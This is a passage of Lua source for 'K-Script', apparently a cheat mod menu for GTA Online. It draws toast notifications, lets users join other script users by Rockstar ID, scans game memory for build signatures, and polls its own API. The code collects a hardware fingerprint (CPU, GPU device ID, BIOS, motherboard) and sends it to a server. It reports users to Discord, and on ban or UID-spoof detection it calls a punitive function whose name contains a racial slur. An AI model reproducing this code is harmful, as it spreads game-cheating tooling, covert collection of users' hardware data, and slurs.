  local preset = currentToastPreset()
  local available = hardMax

  if anchorX then
    if preset == 2 then
      available = screenWidth - anchorX - edgePadding
    elseif preset == 3 then
      available = anchorX - edgePadding
    else
      available = math.min(anchorX - edgePadding, screenWidth - anchorX - edgePadding) * 2
    end
  end

  return math.max(260, math.min(hardMax, available))
end

function wrapToastText(text, maxWidth)
  text = tostring(text or "")
  local lines = {}
  if maxWidth <= 0 then
    return lines
  end

  local current = ""
  for word in text:gmatch("%S+") do
    local candidate = current == "" and word or (current .. " " .. word)
    if (ImGui.CalcTextSize(candidate) or 0) <= maxWidth then
      current = candidate
    else
      if current ~= "" then
        lines[#lines + 1] = current
      end

      if (ImGui.CalcTextSize(word) or 0) <= maxWidth then
        current = word
      else
        local fragment = ""
        for index = 1, #word do
          local char = word:sub(index, index)
          local nextFragment = fragment .. char
          if (ImGui.CalcTextSize(nextFragment) or 0) <= maxWidth then
            fragment = nextFragment
          else
            if fragment ~= "" then
              lines[#lines + 1] = fragment
            end
            fragment = char
          end
        end
        current = fragment
      end
    end
  end

  if current ~= "" then
    lines[#lines + 1] = current
  end
  if #lines == 0 then
    lines[1] = ""
  end

  return lines
end

function calcToastMetrics(toast, screenWidth, screenHeight)
  local title = tostring(toast.title or "")
  local message = tostring(toast.message or ""):gsub("%s+", " ")
  local padX = math.max(screenWidth * 0.015, 12)
  local padY = math.max(screenHeight * 0.01, 8)
  local gapY = math.max(screenHeight * 0.004, 5)
  local lineHeight = 14
  local fontSafetyY = math.max(lineHeight * 0.35, 8)
  local imageSize = math.max(screenHeight * 0.045, lineHeight * 2)
  local minWidth = math.max(imageSize + padX * 3 + 170, 280)
  local maxWidth = math.max(minWidth, calcToastMaxWidth(screenWidth, screenHeight))
  local contentWidth = math.max(calcTextWidth(title), calcTextWidth(message))
  local width = math.max(minWidth, math.min(imageSize + padX + contentWidth + padX * 2, maxWidth))
  local textWidth = math.max(width - imageSize - padX * 3, 1)
  local titleLines = wrapToastText(title, textWidth)
  local messageLines = wrapToastText(message, textWidth)
  local textHeight = (#titleLines * lineHeight) + gapY + (#messageLines * lineHeight)
  local height = math.max(padY * 2 + textHeight + fontSafetyY, padY * 2 + imageSize, 64)

  return {
    w = width,
    h = height,
    imgSize = imageSize,
    padX = padX,
    padY = padY,
    gapY = gapY,
    lineH = lineHeight,
    titleH = #titleLines * lineHeight,
    msgH = #messageLines * lineHeight,
    titleLines = titleLines,
    msgLines = messageLines,
    fontSafetyY = fontSafetyY,
  }
end

function calcToastWidth(toast, screenWidth, screenHeight)
  return calcToastMetrics(toast, screenWidth, screenHeight).w
end

function getBasePos(screenWidth, screenHeight, toastWidth)
  local edgePadding = scaledPadding(screenHeight)

  if anchorX and anchorY then
    local preset = currentToastPreset()
    if preset == 2 then
      return clamp(anchorX, edgePadding, screenWidth - toastWidth - edgePadding), anchorY
    end
    if preset == 3 then
      return clamp(anchorX - toastWidth, edgePadding, screenWidth - toastWidth - edgePadding), anchorY
    end
    return clamp(anchorX - toastWidth / 2, edgePadding, screenWidth - toastWidth - edgePadding), anchorY
  end

  return clamp(toastXOffset:GetFloatValue(), edgePadding, screenWidth - toastWidth - edgePadding), toastYOffset:GetFloatValue()
end

function fitsScreen(x, y, width, height, screenWidth, screenHeight)
  return x >= 0 and y >= 0 and x + width <= screenWidth and y + height <= screenHeight
end

function packColor(red, green, blue, alpha)
  red = math.floor(math.max(0, math.min(255, red)))
  green = math.floor(math.max(0, math.min(255, green)))
  blue = math.floor(math.max(0, math.min(255, blue)))
  alpha = math.floor(math.max(0, math.min(255, alpha)))
  return (alpha << 24) | (blue << 16) | (green << 8) | red
end

function addToast(message)
  local now = ImGui.GetTime()
  local normalizedMessage = tostring(message or "")

  local function findExistingToast(list)
    for _, toast in ipairs(list) do
      if (toast.baseMessage or toast.message) == normalizedMessage then
        return toast
      end
    end
    return nil
  end

  local toast = findExistingToast(toasts) or findExistingToast(overflowQueue)
  if toast then
    toast.baseMessage = normalizedMessage
    toast.count = (toast.count or 1) + 1
    toast.message = formatToastMessage(toast.baseMessage, toast.count)
    toast.alpha = 1
    toast.progress = 0
    toast.startTime = now
    toast.fadeCompleteTime = nil
    toast.renewing = true
    toast.renewStartTime = now
    return
  end

  overflowQueue[#overflowQueue + 1] = {
    id = nextToastId,
    title = "K-Script",
    baseMessage = normalizedMessage,
    count = 1,
    message = normalizedMessage,
    startTime = now,
    texture = toastTexture,
    alpha = 1,
    progress = 0,
    fadeCompleteTime = nil,
  }

  nextToastId = nextToastId + 1
end

local function smoothStep(value)
  value = clamp(value, 0, 1)
  return value * value * (3 - value * 2)
end

local function stackDirection(baseY, toastHeight, screenHeight)
  if screenHeight * 0.66 < baseY and (screenHeight - baseY - toastHeight) < baseY then
    return -1
  end
  return 1
end

local function moveQueuedToVisible(screenWidth, screenHeight, gap)
  while #overflowQueue > 0 do
    local metrics = calcToastMetrics(overflowQueue[1], screenWidth, screenHeight)
    local baseX, baseY = getBasePos(screenWidth, screenHeight, metrics.w)
    local direction = stackDirection(baseY, metrics.h, screenHeight)
    local y = baseY + (#toasts * (metrics.h + gap) * direction)

    if not fitsScreen(baseX, y, metrics.w, metrics.h, screenWidth, screenHeight) then
      break
    end

    toasts[#toasts + 1] = table.remove(overflowQueue, 1)
  end
end

local function drawToastText(x, y, lines, lineHeight, red, green, blue, alpha)
  for index, line in ipairs(lines) do
    ImGui.AddText(x, y + ((index - 1) * lineHeight), line, red, green, blue, alpha)
  end
end

function drawToasts()
  local now = ImGui.GetTime()
  local screenWidth, screenHeight = ImGui.GetDisplaySize()
  local gap = math.max(screenHeight * 0.004, 2)
  local fadeDuration = fadeOutDuration:GetFloatValue()

  moveQueuedToVisible(screenWidth, screenHeight, gap)

  local bgR, bgG, bgB = ToastColor:GetColor()
  local progressBgR, progressBgG, progressBgB = progressBgColor:GetColor()
  local progressFgR, progressFgG, progressFgB = progressFgColor:GetColor()
  local titleR, titleG, titleB = Titlecolor:GetColor()
  local messageR, messageG, messageB = messagecolor:GetColor()

  local index = 1
  while index <= #toasts do
    local toast = toasts[index]
    local metrics = calcToastMetrics(toast, screenWidth, screenHeight)
    local baseX, baseY = getBasePos(screenWidth, screenHeight, metrics.w)
    local direction = stackDirection(baseY, metrics.h, screenHeight)
    local y = baseY + ((index - 1) * (metrics.h + gap) * direction)
    local removedToast = false

    if not fitsScreen(baseX, y, metrics.w, metrics.h, screenWidth, screenHeight) then
      table.insert(overflowQueue, 1, table.remove(toasts, index))
      removedToast = true
    else
      toast.progress = math.min((now - toast.startTime) / 8, 1)

      local fade = 0
      if toast.progress >= 1 then
        fade = smoothStep(((now - toast.startTime) - 8) / fadeDuration)
        if fade >= 1 then
          if not toast.fadeCompleteTime then
            toast.fadeCompleteTime = now
          elseif now - toast.fadeCompleteTime > 0.15 then
            table.remove(toasts, index)
            moveQueuedToVisible(screenWidth, screenHeight, gap)
            removedToast = true
          end
        end
      end

      if not removedToast then
        local alpha = math.floor((1 - fade) * 255)
        local x = baseX
        local radius = screenHeight * 0.012
        local progressHeight = math.max(screenHeight * 0.004, 2)

        ImGui.AddRectFilled(x, y, x + metrics.w, y + metrics.h, bgR, bgG, bgB, alpha, radius)
        ImGui.AddLine(x + metrics.padX, y + 1, x + metrics.w - metrics.padX, y + 1, 255, 255, 255, math.floor(alpha * 0.08))

        local progressX = x + metrics.padX
        local progressY = y + metrics.h - metrics.padY
        local progressWidth = metrics.w - (metrics.padX * 2)
        ImGui.AddRectFilled(progressX, progressY, progressX + progressWidth, progressY + progressHeight, progressBgR, progressBgG, progressBgB, alpha, progressHeight / 2)
        ImGui.AddRectFilled(progressX, progressY, progressX + (progressWidth * toast.progress), progressY + progressHeight, progressFgR, progressFgG, progressFgB, alpha, progressHeight / 2)

        if toast.texture then
          local texture = toast.texture:GetCurrent()
          if texture then
            local imageX = x + metrics.padX
            local imageY = y + (metrics.h - metrics.imgSize) / 2
            ImGui.AddImage(texture, imageX, imageY, imageX + metrics.imgSize, imageY + metrics.imgSize, 0, 0, 1, 1, packColor(255, 255, 255, alpha))
          end
        end

        local textX = x + metrics.padX + metrics.imgSize + metrics.padX
        local totalTextHeight = (#metrics.titleLines * metrics.lineH) + metrics.gapY + (#metrics.msgLines * metrics.lineH)
        local textY = y + ((metrics.h - totalTextHeight) / 2) + (metrics.fontSafetyY * 0.25)
        drawToastText(textX, textY, metrics.titleLines, metrics.lineH, titleR, titleG, titleB, alpha)
        drawToastText(textX, textY + (#metrics.titleLines * metrics.lineH) + metrics.gapY, metrics.msgLines, metrics.lineH, messageR, messageG, messageB, alpha)

        if toast.renewing and toast.renewStartTime then
          local elapsed = now - toast.renewStartTime
          if elapsed < 0.7 then
            local pulse = (math.cos((elapsed / 0.2) * math.pi) + 1) / 2
            ImGui.AddRectFilled(x, y, x + metrics.w, y + metrics.h, 255, 255, 255, math.floor(pulse * 60 * (1 - fade)), radius)
          else
            toast.renewing = false
          end
        end
      end
    end

    if not removedToast then
      index = index + 1
    end
  end

  if FileMgr.DoesFileExist(texturePath) then
    FileMgr.DeleteFile(texturePath)
  end
end

function renderToasts()
  updateToastAnchors()
  if #toasts > 0 or #overflowQueue > 0 then
    drawToasts()
  end
end

local function notify(message)
  addToast(message)
  Logger.Log(eLogColor.GREEN, "K-Script", message)
end

local featureTransitions = FeatAdd(
  Utils.Joaat("FeatureTransitions"),
  "Feature Transitions",
  eFeatureType.Toggle,
  "Enable smooth feature transitions when switching tabs.",
  function(feature)
    if not feature:IsToggled() then
      cursorPos = -1
    end
  end
)
featureTransitions:Toggle()

local featureTransitionPosition = FeatAdd(Utils.Joaat("FeatureTransitionsPosition"), "Position", eFeatureType.SliderInt, "Set the position where the transitions start.")
featureTransitionPosition:SetLimitValues(-500, -10)
featureTransitionPosition:SetIntValue(-100)

local featureTransitionSpeed = FeatAdd(Utils.Joaat("FeatureTransitionsTransitionSpeed"), "Transition Speed", eFeatureType.SliderFloat, "Set the speed between the transitions.")
featureTransitionSpeed:SetLimitValues(0.025, 0.6)
featureTransitionSpeed:SetFloatValue(0.07)

local fadeContent = FeatAdd(
  Utils.Joaat("FadeContent"),
  "Fade Content",
  eFeatureType.Toggle,
  "Enable smooth fades when switching tabs.",
  function(feature)
    if not feature:IsToggled() then
      fadeContentAlpha = 1
    end
  end
)
fadeContent:Toggle(true)

local fadeContentSpeed = FeatAdd(Utils.Joaat("FadeContentFadeSpeed"), "Fade Speed", eFeatureType.SliderFloat, "Set the fade speed.")
fadeContentSpeed:SetLimitValues(0.1, 2)
fadeContentSpeed:SetFloatValue(0.75)

local fadeInitialValue = FeatAdd(Utils.Joaat("FadeContentFadeInitialValue"), "Fade Initial Value", eFeatureType.SliderFloat, "Set the value at which the fade gets reset.")
fadeInitialValue:SetLimitValues(0, 0.99)
fadeInitialValue:SetFloatValue(0.125)

local onlineUserFeatures = {
  Features = {},
  LegacyUsers = { PublicUsers = {}, NonPublicUsers = {} },
  EnhancedUsers = { PublicUsers = {}, NonPublicUsers = {} },
  RenderTableMap = {},
}

UpdateFeatureButtonsFirstRun = true
retryAttempt = 0

local function stripNameSuffix(name)
  return tostring(name or ""):match("^(.-)%s*%b()$") or tostring(name or "")
end

local function targetOnlineUserList(gameVersion, sessionType)
  local versionBucket = gameVersion == "Legacy" and onlineUserFeatures.LegacyUsers or onlineUserFeatures.EnhancedUsers
  return sessionType == "Public" and versionBucket.PublicUsers or versionBucket.NonPublicUsers
end

local function moveFeatureToList(hash, destination)
  local currentList = onlineUserFeatures.RenderTableMap[hash]
  if currentList == destination then
    return
  end

  if currentList then
    for index, value in ipairs(currentList) do
      if value == hash then
        table.remove(currentList, index)
        break
      end
    end
  end

  destination[#destination + 1] = hash
  onlineUserFeatures.RenderTableMap[hash] = destination
end

local function canJoinUserGameVersion(user)
  if isGameVersionEnhanced and user.GameVersion == "Legacy" then
    return false
  end
  if not isGameVersionEnhanced and user.GameVersion == "Enhanced" then
    return false
  end
  return true
end

local function waitForMainTransition(timeoutMs)
  local startedAt = Time.GetEpocheMs()
  while not maintransitionActive and Time.GetEpocheMs() < startedAt + timeoutMs and not ShouldUnload() do
    Script.Yield(2000)
  end
  return maintransitionActive and Time.GetEpocheMs() < startedAt + timeoutMs
end

local function joinOnlineUser(user, displayName)
  if not canJoinUserGameVersion(user) then
    notify(("Cannot Join %s due to Game Version mismatch!\nYou must be on %s to join them."):format(displayName, user.GameVersion))
    return
  end

  notify(("Trying to Join K-Script User %s..."):format(displayName))

  local notifyJoin = FeatureMgr.GetFeatureByName("Notify On Player Join")
  local notifyLeave = FeatureMgr.GetFeatureByName("Notify On Player Leave")
  if notifyJoin then notifyJoin:SetValue(false) end
  if notifyLeave then notifyLeave:SetValue(false) end

  local oldX, oldY, oldZ = ENTITY.GET_ENTITY_COORDS(getPlayerPed())
  local ridFeature = FeatureMgr.GetFeature(Utils.Joaat("SCAPIRID"))
  ridFeature:SetIntValue(tonumber(user.current_rid) or 0)
  FeatureMgr.GetFeatureByName("Join Rockstar Id"):TriggerCallback()
  Script.Yield(650)
  ridFeature:SetIntValue(12345)

  if waitForMainTransition(15000) then
    notify("Joined player successfully!")
  else
    notify("K-Script User Join Failed: mainTransition not launched.")
    return
  end

  SendToDiscord("status", ("%s(%i) is joining K-Script User %s"):format(SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(), Cherax.GetUID(), displayName))

  if notifyJoin then notifyJoin:SetValue(true) end
  if notifyLeave then notifyLeave:SetValue(true) end

  while getTransitionState() ~= 66 and not ShouldUnload() do
    Script.Yield(100)
  end

  for _ = 0, 5 do
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(getPlayerPed(), oldX, oldY, oldZ, false, false, false)
  end
end

function UpdateFeatureButtons(users)
  local seenRids = {}
  local uniqueUsers = {}

  for _, entry in ipairs(users) do
    local user = entry.current_rid or entry
    if user and user.current_rid and not seenRids[user.current_rid] then
      uniqueUsers[#uniqueUsers + 1] = user
      seenRids[user.current_rid] = true
    end
  end

  local liveFeatureHashes = {}
  local localRid = getLocalRockstarId()

  for _, user in ipairs(uniqueUsers) do
    local rid = tostring(user.current_rid)
    if rid ~= localRid then
      local hash = Utils.Joaat(rid)
      local displayName = stripNameSuffix(user.client_name)
      local sessionType = user.SessionType or "Unknown"
      local gameVersion = user.GameVersion or "Unknown"
      local targetList = targetOnlineUserList(gameVersion, sessionType)

      liveFeatureHashes[hash] = rid

      local existing = onlineUserFeatures.Features[hash]
      if existing and (existing.SessionType ~= sessionType or existing.GameVersion ~= gameVersion) then
        FeatureMgr.RemoveFeature(hash)
        onlineUserFeatures.Features[hash] = nil
        existing = nil
      end

      if existing then
        existing.SessionType = sessionType
        moveFeatureToList(hash, targetList)
      elseif user.isInPool == 1 or isDev or isAdmin or isModerator then
        FeatAdd(hash, ("Join %s (%s - %s)"):format(user.client_name, gameVersion, sessionType), eFeatureType.Button, "", function()
          joinOnlineUser(user, displayName)
        end, true)

        onlineUserFeatures.Features[hash] = {
          rid = rid,
          name = displayName,
          SessionType = sessionType,
          GameVersion = gameVersion,
          inPool = user.isInPool,
        }

        moveFeatureToList(hash, targetList)

        if notifyEnabled and not UpdateFeatureButtonsFirstRun and (isAdmin or isModerator) then
          if displayName == "CMsgJoinRequest" then
            notify(("K-Script Developer %s came online."):format(displayName))
          else
            notify(("K-Script User %s came online. (%s)"):format(displayName, gameVersion))
          end
        end
      end
    end

    Script.Yield()
  end

  UpdateFeatureButtonsFirstRun = false

  for hash, metadata in pairs(onlineUserFeatures.Features) do
    if not liveFeatureHashes[hash] then
      FeatureMgr.RemoveFeature(hash)

      if notifyEnabled and (isAdmin or isModerator) then
        if metadata.name == "CMsgJoinRequest" then
          notify(("K-Script Developer %s has gone offline. (%s)"):format(metadata.name, metadata.GameVersion))
        else
          notify(("K-Script User %s has gone offline. (%s)"):format(metadata.name, metadata.GameVersion))
        end
      end

      local list = onlineUserFeatures.RenderTableMap[hash]
      if list then
        for index, value in ipairs(list) do
          if value == hash then
            table.remove(list, index)
            break
          end
        end
      end

      onlineUserFeatures.RenderTableMap[hash] = nil
      onlineUserFeatures.Features[hash] = nil
    elseif not metadata.inPool and not isDev and not isAdmin and not isModerator then
      FeatureMgr.RemoveFeature(hash)
      onlineUserFeatures.Features[hash] = nil
    end
  end
end

function GetOnlineUserInfo()
  local function request()
    if not ensureApiAuthenticated("GetOnlineUserInfo", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
      return
    end

    local curl = Curl.Easy()
    curl:Setopt(eCurlOption.CURLOPT_URL, API_BASE .. "/online_user_lookup")
    addAuthHeaders(curl)

    curl:Setopt(eCurlOption.CURLOPT_POSTFIELDS, json.encode({
      client_name = ("%s(%s)"):format(SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME(), tostring(Cherax.GetUID())),
      IsInPool = tostring(isInPool),
      game_version = getGameVersion(isGameVersionEnhanced),
      session_type = getSessionType(),
    }))
    curl:Setopt(eCurlOption.CURLOPT_POST, 1)
    curl:Setopt(eCurlOption.CURLOPT_USERAGENT, "K-Script V27")
    curl:DisableErrorLog()
    curl:Perform()
    waitForCurl(curl, 5)

    local code, response = curl:GetResponse()
    local responseText = tostring(response)

    if responseNeedsApiRefresh(responseText) then
      if refreshApiKey("GetOnlineUserInfo", SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()) then
        Script.QueueJob(request)
      end
      return
    end

    if code ~= eCurlCode.CURLE_OK or responseText:find("error", 1, true) then
      if responseIsUnauthorized(responseText) then
        Logger.LogError("K-Script: Session Ticket Revoked!")
        FuckTheniggersGame()
        return
      end

      if retryAttempt <= 3 then
        retryAttempt = retryAttempt + 1
        Script.QueueJob(request)
        return
      end

      Logger.LogError("K-Script: Fatal Error on GOUI Occurred, unloading...")
      if isAdmin then
        Logger.LogError(("(GetOnlineUserInfo) K-Script: WebServer Response Code: %i, ResponseBody: %s"):format(code, responseText))
      end
      SetShouldUnload()
      return
    end

    local users = {}
    local pattern =
      '"client_name"%s*:%s*"([^"]+)"%s*,%s*"last_con"%s*:%s*"([^"]+)"%s*,%s*"current_rid"%s*:%s*"([^"]+)"%s*,%s*"isInPool"%s*:%s*([%d]+)%s*,%s*"GameVersion"%s*:%s*"([^"]+)"%s*,%s*"session_type"%s*:%s*"([^"]+)"'

    for clientName, lastConnected, rid, isUserInPool, gameVersion, sessionType in responseText:gmatch(pattern) do
      users[#users + 1] = {
        current_rid = {
          client_name = clientName,
          last_con = lastConnected,
          current_rid = rid,
          isInPool = tonumber(isUserInPool),
          GameVersion = gameVersion,
          SessionType = sessionType,
        },
      }
    end

    if #users > 0 and isSupporter then
      UpdateFeatureButtons(users)
    end

    retryAttempt = 0
    Script.Yield()
  end

  Script.QueueJob(request)
end

function getGameVersion(enhanced)
  return enhanced and "Enhanced" or "Legacy"
end

local hardwareCheckSent = false

local function buildHardwarePayload()
  return {
    cpu = {
      name = HW_COMPONENTS and HW_COMPONENTS.CPU_NAME or nil,
      cores = HW_COMPONENTS and HW_COMPONENTS.NUM_CPU_PHYS_CORES or nil,
    },
    gpu = {
      name = HW_COMPONENTS and HW_COMPONENTS.GPU_NAME or nil,
      pnpDeviceId = HW_COMPONENTS and HW_COMPONENTS.GPU_PNP_DEVICE_ID or nil,
    },
    mobo = {
      model = HW_COMPONENTS and HW_COMPONENTS.MOBO_NAME or nil,
    },
    bios = {
      vendor = HW_COMPONENTS and HW_COMPONENTS.BIOS_VENDOR or nil,
      manufacturer = HW_COMPONENTS and HW_COMPONENTS.BASE_BOARD_MANUFA or nil,
    },
    telemetry = {
      cpuSpeed = HW_COMPONENTS and HW_COMPONENTS.CPU_SPEED or nil,
      gpuDriverName = HW_COMPONENTS and HW_COMPONENTS.GPU_DRIVER_NAME or nil,
      gpuDirectXVersion = HW_COMPONENTS and HW_COMPONENTS.GPU_DIRECTX_VERSION or nil,
      biosVersion = HW_COMPONENTS and HW_COMPONENTS.BIOS_VERSION or nil,
      windowsVersion = HW_COMPONENTS and HW_COMPONENTS.WINDOWS_VERSION or nil,
    },
  }
end

function Heartbeat()
  if not hardwareCheckSent then
    if isSupporter or isAdmin or isDev then
      HardwareCheck(buildHardwarePayload())
      Script.Yield(1000)
    end
    hardwareCheckSent = true
  end

  local rid = getLocalRockstarId()
  if rid:find("Error", 1, true) then
    rid = "hb_Error"
  end

  playercount = string.format("%i/65", numConnectedPlayers)
  FetchBlacklistRIDList()
  Script.QueueJob(FetchUserPermissions, true)
  GetOnlineUserInfo()

  if isSupporter or isAdmin then
    FetchModderDatabase()
  end

  Script.Yield(30000)
end

local function displayOrNA(value)
  if value == nil or value == "" then
    return "N/A"
  end
  return tostring(value)
end

executingSettingsLoad = false

local function applyFeatureConfigValue(feature, value)
  local featureType = feature:GetType()

  if featureType == eFeatureType.Combo then
    feature:SetListIndex(tonumber(value) or 0)
  elseif featureType == eFeatureType.SliderInt or featureType == eFeatureType.InputInt then
    feature:SetIntValue(tonumber(value) or 0)
  elseif featureType == eFeatureType.SliderFloat then
    feature:SetFloatValue(tonumber(value) or 0)
  elseif featureType == eFeatureType.InputText then
    feature:SetStringValue(tostring(value))
  elseif featureType == eFeatureType.InputColor4 and type(value) == "table" then
    feature:SetColor(tonumber(value[1]) or 0, tonumber(value[2]) or 0, tonumber(value[3]) or 0, tonumber(value[4]) or 255)
  end
end

local function applyToggleConfigValue(feature, hash, value)
  if feature:GetType() ~= eFeatureType.Toggle then
    return
  end

  local enabled = value == true
  if isDev then
    Logger.Log(eLogColor.GREEN, "K-Script", ("Applying toggle %s (%s) -> %s"):format(tostring(hash), tostring(registeredFeatures.hashAndName[hash] or "unknown"), tostring(enabled)))
  end

  local ok, errorMessage = pcall(function()
    feature:SetValue(enabled)
    feature:OnClick()
  end)

  if not ok and isDev then
    notify(("Toggle callback failed %s: %s"):format(tostring(hash), tostring(errorMessage)))
  end
end

function loadDefaultConfig()
  executingSettingsLoad = true
  Script.Yield(1000)

  if ShouldUnload() then
    executingSettingsLoad = false
    return
  end

  local ok, errorMessage = pcall(function()
    notify("Loading default config...")

    local configPath = menuRootPath .. "\\DefaultConfig.json"
    if not FileMgr.DoesFileExist(configPath) then
      local saveFeature = FeatureMgr.GetFeature(Utils.Joaat("savekscript"))
      saveFeature:OnClick()
      notify("Created default config")
      return
    end

    local decoded = json.decode(FileMgr.ReadFileContent(configPath))
    if type(decoded) ~= "table" or type(decoded.features) ~= "table" then
      notify("Invalid JSON format.")
      return
    end

    for rawHash, config in pairs(decoded.features) do
      local hash = tonumber(rawHash)
      if hash and type(config) == "table" and config.value ~= nil then
        local feature = FeatureMgr.GetFeature(hash)
        if feature then
          applyFeatureConfigValue(feature, config.value)
        end
      end
    end

    for rawHash, config in pairs(decoded.features) do
      local hash = tonumber(rawHash)
      if hash and type(config) == "table" and config.value ~= nil then
        local feature = FeatureMgr.GetFeature(hash)
        if feature then
          applyToggleConfigValue(feature, hash, config.value)
        end
      end
    end

    local gameInfoX = decoded.features.GameInfoDisplayPosX and tonumber(decoded.features.GameInfoDisplayPosX.value)
    local gameInfoY = decoded.features.GameInfoDisplayPosY and tonumber(decoded.features.GameInfoDisplayPosY.value)
    if gameInfoX and gameInfoY then
      StoredPos.GameInfoDisplay = V2.New(gameInfoX, gameInfoY)
      infowindowPositionSet = false
      if isDev then
        Logger.Log(eLogColor.GREEN, "K-Script", ("Applied GameInfoDisplayPos -> X: %s Y: %s"):format(tostring(gameInfoX), tostring(gameInfoY)))
      end
    elseif isDev then
      Logger.Log(eLogColor.RED, "K-Script", "GameInfoDisplayPosX/Y missing or invalid in config.")
    end

    local modderX = decoded.features.ModderDisplayPosX and tonumber(decoded.features.ModderDisplayPosX.value)
    local modderY = decoded.features.ModderDisplayPosY and tonumber(decoded.features.ModderDisplayPosY.value)
    if modderX and modderY then
      StoredPos.ModderDisplay = V2.New(modderX, modderY)
      windowPositionSet = false
      if isDev then
        Logger.Log(eLogColor.GREEN, "K-Script", ("Applied ModderDisplayPos -> X: %s Y: %s"):format(tostring(modderX), tostring(modderY)))
      end
    elseif isDev then
      Logger.Log(eLogColor.RED, "K-Script", "ModderDisplayPosX/Y missing or invalid in config.")
    end

    notify("Default config loaded successfully!")
  end)

  executingSettingsLoad = false

  if not ok and isDev then
    Logger.LogError(("Load Default config had an error: %s"):format(tostring(errorMessage)))
  end
end

function bitwise_or(left, right)
  return (left or 0) | (right or 0)
end

HW_COMPONENTS = {
  CPU_NAME = nil,
  CPU_SPEED = nil,
  NUM_CPU_PHYS_CORES = nil,
  GPU_NAME = nil,
  GPU_DRIVER_NAME = nil,
  GPU_DIRECTX_VERSION = nil,
  GPU_PNP_DEVICE_ID = nil,
  MOBO_NAME = nil,
  BIOS_VERSION = nil,
  BIOS_VENDOR = nil,
  BASE_BOARD_MANUFA = nil,
  WINDOWS_VERSION = nil,
}

Logger.Log(eLogColor.GREEN, "K-Script", "Starting...")

if SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME() == "UNKNOWN" and getLocalRockstarId() == "6" then
  notify("You are not signed into Socialclub, unloading...")
  SetShouldUnload()
  return
end

if cachedUID ~= Cherax.GetUID() then
  SendToDiscord(
    "lol",
    ("UID Spoofing Attempt: Original UID: %i, Tried to Spoof as UID: %i SC Name: %s <@780905379277963345> <@&1218696603892977774>"):format(
      cachedUID,
      Cherax.GetUID(),
      SOCIALCLUB.SC_ACCOUNT_INFO_GET_NICKNAME()
    )
  )
  Logger.Log(eLogColor.RED, "K-Script Security", ("Detected UID Spoofing Attempt, Cached: %s Current: %s"):format(tostring(cachedUID), tostring(Cherax.GetUID())))
  FuckTheniggersGame()
  return
end

if tableContainsValue(blacklistRIDList, getLocalRockstarId()) then
  Logger.Log(eLogColor.RED, "K-Script", "You`ve been Banned from using K-Script!")
  SendToDiscord("lol", ("Banned User tried to load K-Script, Banned UID: %i"):format(Cherax.GetUID()))
  FuckTheniggersGame()
  return
end

Logger.Log(eLogColor.GREEN, "K-Script", "Scanning Signatures...")

function ptrnScan(name, pattern)
  local address = Memory.Scan(pattern)
  if address and address ~= 0 then
    if isDev then
      Logger.Log(eLogColor.GREEN, "K-Script", ("Found %s @ 0x%X"):format(name, address))
    else
      Logger.Log(eLogColor.GREEN, "K-Script", ("Found %s"):format(name))
    end
    return address
  end

  if name ~= "GBS" then
    Logger.Log(eLogColor.RED, "K-Script", ("Failed to find %s"):format(name))
    SetShouldUnload()
  end

  return nil
end

local function parseBuildPair(build)
  local major, minor = tostring(build or ""):match("^(%d+)%.(%d+)$")
  return tonumber(major), tonumber(minor)
end

local function rejectUnsupportedBuild(build)
  GUI.AddToast("K-Script", ("Unsupported Game Build Detected!\nPlease wait for an Update! (%s)"):format(tostring(build)), 15000, eToastPos.TOP_RIGHT)
  if isDev then
    Logger.LogInfo(("Current Game Build: %s"):format(tostring(build)))
  end
  SetShouldUnload()
end

local function scanGameBuild()
  local legacyBuildAddress = ptrnScan("GBS", "?? ?? ?? ?? ?? ?? 4D 86 87 98 7F 8E 89 7F 6C 81 98 87")

  if legacyBuildAddress then
    local build = Memory.ReadString(legacyBuildAddress)
    if build ~= "6011.3-dev_ng_Live" then
      rejectUnsupportedBuild(build)
      return false
    end

    isGameVersionEnhanced = false
    return true
  end

  local enhancedPatternAddress = ptrnScan("GBSE", "5C 9D 1D ? ? ? ? 59 9D 6C 35 ? 59 90 D0 59 90 FA")
  local enhancedBuildAddress = enhancedPatternAddress and Memory.Rip(enhancedPatternAddress + 3)

  if not enhancedBuildAddress then
    GUI.AddToast("K-Script", "Failed to Find critical Patterns!", 15000, eToastPos.TOP_RIGHT)
    SetShouldUnload()
    return false
  end

  local build = Memory.ReadString(enhancedBuildAddress)
  isGameVersionEnhanced = true

  local expectedMajor, expectedMinor = parseBuildPair("5457.78")
  local actualMajor, actualMinor = parseBuildPair(build)

  if not actualMajor or actualMajor ~= expectedMajor then
    rejectUnsupportedBuild(build)
    return false
  end

  if actualMinor ~= expectedMinor then
    GUI.AddToast("K-Script", ("Game Build Revision Changed!\nScript may still work, but use caution. (%s)"):format(tostring(build)), 10000, eToastPos.TOP_RIGHT)
    if isDev then
      Logger.LogInfo(("Current Game Build Revision: %s"):format(tostring(build)))
    end
  end

  return true
end

if not scanGameBuild() then
  return
end

Logger.Log(eLogColor.GREEN, "K-Script", ("Game Version: %s"):format(getGameVersion(isGameVersionEnhanced)))

local function ripPattern(name, legacyPattern, enhancedName, enhancedPattern, offset)
  local patternName = isGameVersionEnhanced and enhancedName or name
  local pattern = isGameVersionEnhanced and enhancedPattern or legacyPattern
  local address = ptrnScan(patternName, pattern)
  if not address then
    return nil
  end
  return Memory.Rip(address + (offset or 3))
end

local patternAddresses = {
  CPU_NAME = ripPattern("GCIN", "26 6D 8D ? ? ? ? 29 B7 82 89 88 88", "GCINE", "59 9D 1D ? ? ? ? 59 9D 26 ? ? ? ? 5C 9D 16 ? ? ? ? 52 B0 15 12 11 11"),
  CPU_SPEED = ripPattern("GCIS", "4C 8D 05 ? ? ? ? 48 8D 15 ? ? ? ? 48 8D 0D ? ? ? ? 41 B9 04 01 00 00", "GCISE", "5C 9D 16 ? ? ? ? 52 B0 15 12 11 11"),
  GPU_TABLE = ripPattern("GVCIN", "82 2D 4D ? ? ? ? C1 88 68 ? ? ? ? ? 82 23 88 68", "GPTBE", "7C 1D 5D ? ? ? ? 71 1B 6D"),
